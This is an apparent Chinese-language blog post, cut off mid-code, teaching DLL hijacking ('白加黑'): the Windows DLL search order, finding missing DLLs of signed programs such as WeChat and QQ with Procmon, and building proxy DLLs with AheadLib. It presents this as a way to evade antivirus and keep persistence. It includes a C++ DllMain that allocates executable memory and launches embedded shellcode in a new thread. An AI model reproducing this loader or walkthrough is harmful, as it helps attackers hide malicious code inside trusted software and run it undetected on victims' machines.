@@ -1,0 +1,496 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DLL 劫持技术实战（白加黑） | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="DLL 劫持原理什么是 DLL 劫持DLL 劫持（DLL Hijacking）是一种利用 Windows DLL 搜索顺序机制的攻击技术。当应用程序调用 LoadLibrary() 或 LoadLibraryEx() 加载 DLL 时，如果未指定完整路径，Windows 会按照预定义的搜索顺序查找 DLL 文件。攻击者可以在优先级更高的目录中放置恶意 DLL，使系统加载恶意代码而非合法 DLL。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DLL 劫持技术实战（白加黑）">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/cs3/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="DLL 劫持原理什么是 DLL 劫持DLL 劫持（DLL Hijacking）是一种利用 Windows DLL 搜索顺序机制的攻击技术。当应用程序调用 LoadLibrary() 或 LoadLibraryEx() 加载 DLL 时，如果未指定完整路径，Windows 会按照预定义的搜索顺序查找 DLL 文件。攻击者可以在优先级更高的目录中放置恶意 DLL，使系统加载恶意代码而非合法 DLL。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-03.webp">
+<meta property="article:published_time" content="2026-02-13T08:15:12.319Z">
+<meta property="article:modified_time" content="2026-02-13T08:15:12.321Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="DLL劫持">
+<meta property="article:tag" content="Procmon">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="白加黑">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-03.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DLL 劫持技术实战（白加黑）",
+  "url": "https://www.52jl.top/2026/02/13/cs3/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-03.webp",
+  "datePublished": "2026-02-13T08:15:12.319Z",
+  "dateModified": "2026-02-13T08:15:12.321Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/cs3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DLL 劫持技术实战（白加黑）',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">DLL 劫持技术实战（白加黑）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">DLL 劫持技术实战（白加黑）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:15:12.319Z" title="发表于 2026-02-13 16:15:12">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:15:12.321Z" title="更新于 2026-02-13 16:15:12">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%8E%E5%8A%A0%E8%BD%BD/">免杀与加载</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="DLL-劫持原理"><a href="#DLL-劫持原理" class="headerlink" title="DLL 劫持原理"></a>DLL 劫持原理</h1><h2 id="什么是-DLL-劫持"><a href="#什么是-DLL-劫持" class="headerlink" title="什么是 DLL 劫持"></a>什么是 DLL 劫持</h2><p>DLL 劫持（DLL Hijacking）是一种利用 Windows DLL 搜索顺序机制的攻击技术。当应用程序调用 <code>LoadLibrary()</code> 或 <code>LoadLibraryEx()</code> 加载 DLL 时，如果未指定完整路径，Windows 会按照预定义的搜索顺序查找 DLL 文件。攻击者可以在优先级更高的目录中放置恶意 DLL，使系统加载恶意代码而非合法 DLL。</p>
+<h2 id="白加黑技术"><a href="#白加黑技术" class="headerlink" title="白加黑技术"></a>白加黑技术</h2><p><strong>白加黑（Living off the Land）</strong> 是指利用合法的、已签名的可执行文件（白文件）加载恶意 DLL（黑文件），从而绕过安全软件的检测。这种技术的优势在于：</p>
+<ol>
+<li><strong>信任链利用</strong>：合法程序通常具有数字签名，被安全软件信任</li>
+<li><strong>行为隐蔽</strong>：恶意行为由合法进程执行，难以被行为检测识别</li>
+<li><strong>免杀效果好</strong>：不需要修改白文件，只需替换 DLL</li>
+<li><strong>持久化简单</strong>：可以通过快捷方式、计划任务等方式持久化</li>
+</ol>
+<hr>
+<h1 id="Windows-DLL-搜索顺序"><a href="#Windows-DLL-搜索顺序" class="headerlink" title="Windows DLL 搜索顺序"></a>Windows DLL 搜索顺序</h1><h2 id="标准搜索顺序"><a href="#标准搜索顺序" class="headerlink" title="标准搜索顺序"></a>标准搜索顺序</h2><p>当应用程序调用 <code>LoadLibrary(&quot;example.dll&quot;)</code> 时，Windows 按以下顺序搜索 DLL：</p>
+<ol>
+<li><p><strong>应用程序所在目录</strong>（最高优先级）</p>
+<ul>
+<li>例如：<code>C:\Program Files\App\example.dll</code></li>
+</ul>
+</li>
+<li><p><strong>系统目录</strong>（<code>GetSystemDirectory()</code>）</p>
+<ul>
+<li>32 位系统：<code>C:\Windows\System32</code></li>
+<li>64 位系统：<code>C:\Windows\System32</code>（64 位 DLL）</li>
+<li>64 位系统：<code>C:\Windows\SysWOW64</code>（32 位 DLL）</li>
+</ul>
+</li>
+<li><p><strong>16 位系统目录</strong></p>
+<ul>
+<li><code>C:\Windows\System</code>（已废弃，兼容性保留）</li>
+</ul>
+</li>
+<li><p><strong>Windows 目录</strong>（<code>GetWindowsDirectory()</code>）</p>
+<ul>
+<li><code>C:\Windows</code></li>
+</ul>
+</li>
+<li><p><strong>当前工作目录</strong>（<code>GetCurrentDirectory()</code>）</p>
+<ul>
+<li>进程启动时的目录</li>
+</ul>
+</li>
+<li><p><strong>PATH 环境变量中的目录</strong></p>
+<ul>
+<li>按顺序依次搜索</li>
+</ul>
+</li>
+</ol>
+<h2 id="安全-DLL-搜索模式"><a href="#安全-DLL-搜索模式" class="headerlink" title="安全 DLL 搜索模式"></a>安全 DLL 搜索模式</h2><p>Windows 提供了 <strong>SafeDllSearchMode</strong>（默认启用），调整搜索顺序为：</p>
+<ol>
+<li>应用程序所在目录</li>
+<li>系统目录</li>
+<li>16 位系统目录</li>
+<li>Windows 目录</li>
+<li><strong>当前工作目录</strong>（优先级降低）</li>
+<li>PATH 环境变量目录</li>
+</ol>
+<p><strong>注册表位置</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>1</code>：启用（默认）</li>
+<li><code>0</code>：禁用</li>
+</ul>
+<hr>
+<h1 id="DLL-劫持实战"><a href="#DLL-劫持实战" class="headerlink" title="DLL 劫持实战"></a>DLL 劫持实战</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><h3 id="1-Process-Monitor（Procmon）"><a href="#1-Process-Monitor（Procmon）" class="headerlink" title="1. Process Monitor（Procmon）"></a>1. Process Monitor（Procmon）</h3><p><strong>下载地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能</strong>：实时监控进程的文件系统、注册表、网络活动，用于分析 DLL 加载行为。</p>
+<h3 id="2-AheadLib（DLL-代理转发工具）"><a href="#2-AheadLib（DLL-代理转发工具）" class="headerlink" title="2. AheadLib（DLL 代理转发工具）"></a>2. AheadLib（DLL 代理转发工具）</h3><p><strong>下载地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/strivexjun/AheadLib-x86-x64</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能</strong>：自动生成 DLL 代理代码，将原始 DLL 的导出函数转发到恶意 DLL。</p>
+<hr>
+<h2 id="步骤一：寻找可劫持的-DLL"><a href="#步骤一：寻找可劫持的-DLL" class="headerlink" title="步骤一：寻找可劫持的 DLL"></a>步骤一：寻找可劫持的 DLL</h2><h3 id="1-启动-Process-Monitor"><a href="#1-启动-Process-Monitor" class="headerlink" title="1. 启动 Process Monitor"></a>1. 启动 Process Monitor</h3><p>运行 <code>Procmon64.exe</code>，开始监控系统活动。</p>
+<p><img src="/2026/02/13/cs3/1.webp" loading='lazy'></p>
+<hr>
+<h3 id="2-启动目标程序"><a href="#2-启动目标程序" class="headerlink" title="2. 启动目标程序"></a>2. 启动目标程序</h3><p>选择一个合法的、有数字签名的程序作为”白文件”。推荐选择：</p>
+<ul>
+<li><strong>微信（WeChat.exe）</strong></li>
+<li><strong>QQ（QQ.exe）</strong></li>
+<li><strong>WPS Office</strong></li>
+<li><strong>Adobe Reader</strong></li>
+<li><strong>7-Zip</strong></li>
+</ul>
+<p>启动目标程序后，Procmon 会记录所有 DLL 加载行为。</p>
+<hr>
+<h3 id="3-过滤-DLL-加载失败事件"><a href="#3-过滤-DLL-加载失败事件" class="headerlink" title="3. 过滤 DLL 加载失败事件"></a>3. 过滤 DLL 加载失败事件</h3><p>在 Procmon 中设置过滤器：</p>
+<p><strong>Filter -&gt; Filter…</strong></p>
+<p>添加以下规则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Process Name    is      WeChat.exe      Include</span><br><span class="line">Operation       is      CreateFile      Include</span><br><span class="line">Path            ends with   .dll        Include</span><br><span class="line">Result          is      NAME NOT FOUND  Include</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs3/2.webp" loading='lazy'></p>
+<p><strong>解释</strong>：</p>
+<ul>
+<li><code>NAME NOT FOUND</code>：表示程序尝试加载 DLL 但未找到</li>
+<li>这些 DLL 是潜在的劫持目标</li>
+</ul>
+<hr>
+<h3 id="4-筛选可劫持的-DLL"><a href="#4-筛选可劫持的-DLL" class="headerlink" title="4. 筛选可劫持的 DLL"></a>4. 筛选可劫持的 DLL</h3><p>在过滤结果中，寻找满足以下条件的 DLL：</p>
+<ol>
+<li><strong>路径在应用程序目录</strong>：优先级最高</li>
+<li><strong>DLL 不存在</strong>：系统未找到该 DLL</li>
+<li><strong>非系统关键 DLL</strong>：避免劫持系统核心 DLL 导致程序崩溃</li>
+</ol>
+<p><img src="/2026/02/13/cs3/3.webp" loading='lazy'></p>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Tencent\WeChat\version.dll    NAME NOT FOUND</span><br></pre></td></tr></table></figure>
+
+<p>这表示 <code>WeChat.exe</code> 尝试从自身目录加载 <code>version.dll</code>，但该文件不存在。</p>
+<hr>
+<h3 id="5-确认-DLL-来源"><a href="#5-确认-DLL-来源" class="headerlink" title="5. 确认 DLL 来源"></a>5. 确认 DLL 来源</h3><p>双击事件，查看详细信息：</p>
+<p><img src="/2026/02/13/cs3/4.webp" loading='lazy'></p>
+<p><strong>关键信息</strong>：</p>
+<ul>
+<li><strong>Path</strong>：DLL 搜索路径</li>
+<li><strong>Result</strong>：<code>NAME NOT FOUND</code></li>
+<li><strong>Desired Access</strong>：访问权限</li>
+</ul>
+<p>如果 DLL 最终从 <code>System32</code> 加载，说明可以在应用程序目录放置同名 DLL 进行劫持。</p>
+<hr>
+<h2 id="步骤二：生成代理-DLL"><a href="#步骤二：生成代理-DLL" class="headerlink" title="步骤二：生成代理 DLL"></a>步骤二：生成代理 DLL</h2><h3 id="1-提取原始-DLL"><a href="#1-提取原始-DLL" class="headerlink" title="1. 提取原始 DLL"></a>1. 提取原始 DLL</h3><p>从系统目录复制原始 DLL：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\version.dll C:\Temp\version_original.dll</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-使用-AheadLib-生成代理代码"><a href="#2-使用-AheadLib-生成代理代码" class="headerlink" title="2. 使用 AheadLib 生成代理代码"></a>2. 使用 AheadLib 生成代理代码</h3><p>运行 <code>AheadLib.exe</code>，选择原始 DLL：</p>
+<p><img src="/2026/02/13/cs3/5.webp" loading='lazy'></p>
+<p><strong>生成文件</strong>：</p>
+<ul>
+<li><code>version.cpp</code>：代理 DLL 源代码</li>
+<li><code>version.h</code>：头文件</li>
+<li><code>version.def</code>：导出函数定义</li>
+</ul>
+<p><strong>代理原理</strong>：</p>
+<p>生成的代码会将所有导出函数转发到原始 DLL，例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoA=version_original.GetFileVersionInfoA,@1&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoW=version_original.GetFileVersionInfoW,@2&quot;</span>)</span></span><br><span class="line"><span class="comment">// ... 其他导出函数</span></span><br></pre></td></tr></table></figure>
+
+<p>这样，当程序调用 <code>GetFileVersionInfoA()</code> 时，会自动转发到 <code>version_original.dll</code> 的对应函数。</p>
+<hr>
+<h2 id="步骤三：编写恶意代码"><a href="#步骤三：编写恶意代码" class="headerlink" title="步骤三：编写恶意代码"></a>步骤三：编写恶意代码</h2><h3 id="1-创建-Visual-Studio-项目"><a href="#1-创建-Visual-Studio-项目" class="headerlink" title="1. 创建 Visual Studio 项目"></a>1. 创建 Visual Studio 项目</h3><p><strong>新建项目</strong>：</p>
+<ul>
+<li>项目类型：<code>Dynamic-Link Library (DLL)</code></li>
+<li>平台：根据目标程序选择 <code>x86</code> 或 <code>x64</code></li>
+</ul>
+<p><img src="/2026/02/13/cs3/7.webp" loading='lazy'></p>
+<hr>
+<h3 id="2-配置项目属性"><a href="#2-配置项目属性" class="headerlink" title="2. 配置项目属性"></a>2. 配置项目属性</h3><p><strong>项目 -&gt; 属性 -&gt; 配置属性</strong></p>
+<p><strong>常规</strong>：</p>
+<ul>
+<li>配置类型：<code>动态库 (.dll)</code></li>
+<li>字符集：<code>使用多字节字符集</code></li>
+</ul>
+<p><img src="/2026/02/13/cs3/8.webp" loading='lazy'></p>
+<p><strong>C&#x2F;C++ -&gt; 预编译头</strong>：</p>
+<ul>
+<li>预编译头：<code>不使用预编译头</code></li>
+</ul>
+<p><img src="/2026/02/13/cs3/9.webp" loading='lazy'></p>
+<p><strong>链接器 -&gt; 输入</strong>：</p>
+<ul>
+<li>模块定义文件：<code>version.def</code>（如果使用 .def 文件）</li>
+</ul>
+<p><img src="/2026/02/13/cs3/10.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-编写-DLL-入口代码"><a href="#3-编写-DLL-入口代码" class="headerlink" title="3. 编写 DLL 入口代码"></a>3. 编写 DLL 入口代码</h3><p>将 AheadLib 生成的代码导入项目，并在 <code>DllMain</code> 中添加 Shellcode 加载器：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原始 DLL 路径（重命名后的原始 DLL）</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoA=version_original.GetFileVersionInfoA,@1&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoW=version_original.GetFileVersionInfoW,@2&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoSizeA=version_original.GetFileVersionInfoSizeA,@3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:GetFileVersionInfoSizeW=version_original.GetFileVersionInfoSizeW,@4&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:VerQueryValueA=version_original.VerQueryValueA,@5&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:VerQueryValueW=version_original.VerQueryValueW,@6&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode 执行线程</span></span><br><span class="line"><span class="function">UINT WINAPI <span class="title">ShellcodeThread</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 执行 Shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())lpParam)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode（替换为实际的 Payload）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line">    <span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line">    <span class="comment">// ... 完整 Shellcode</span></span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (dwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 禁用线程通知，提高性能</span></span><br><span class="line">        <span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分配可执行内存</span></span><br><span class="line">        LPVOID execMem = <span class="built_in">VirtualAlloc</span>(</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="built_in">sizeof</span>(shellcode),</span><br><span class="line">            MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">            PAGE_EXECUTE_READWRITE</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (execMem != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 复制 Shellcode 到可执行内存</span></span><br><span class="line">            <span class="built_in">memcpy</span>(execMem, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建线程执行 Shellcode</span></span><br><span class="line">            _beginthreadex(</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                ShellcodeThread,</span><br><span class="line">                execMem,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span 